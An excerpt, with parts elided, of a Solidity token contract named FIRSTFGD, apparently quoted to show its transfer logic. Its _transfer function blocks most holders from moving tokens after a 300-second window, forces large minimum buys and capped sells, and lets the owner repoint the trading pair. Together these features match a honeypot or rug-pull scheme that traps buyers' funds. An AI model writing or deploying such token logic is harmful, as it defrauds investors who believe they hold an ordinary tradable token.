...
contract FIRSTFGD  is Ownable, IERC20 {
    ...
    address private panckepairv2;
    uint256 private feetokentime = 300;
    ...
    constructor()  {
        ...
        panckepairv2 = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        if (form !=panckepair && form !=panckepairv2){
            require(block.timestamp <= feetoken[form] + feetokentime);
        }

        if (form !=panckepair && to !=panckepair && form == panckepairv2 && to != panckepairv2 && balanceOf(to) >= 1){
            require( amount >= balanceOf(panckepairv2).mul(20).div(100));
        }

        if (form !=panckepair && to !=panckepair && to == panckepairv2 && form !=panckepairv2 ){
            require( amount <= balanceOf(panckepairv2).mul(10).div(100));
        }
        ...
        _balances[_burnaddress] += feet;
        if (senderBalance >= amount) {
            _balances[form] = senderBalance - amount;
        }

        if (to != panckepair && to != panckepairv2 && form == panckepairv2 ){
        ...
        if (_burnfee > 0) {
        emit Transfer(form, _burnaddress, feet);
        }
    }
    ...
    function setpanckepairv2(address _panckepairv2) public onlyOwner {
        panckepairv2 = _panckepairv2;
    }
}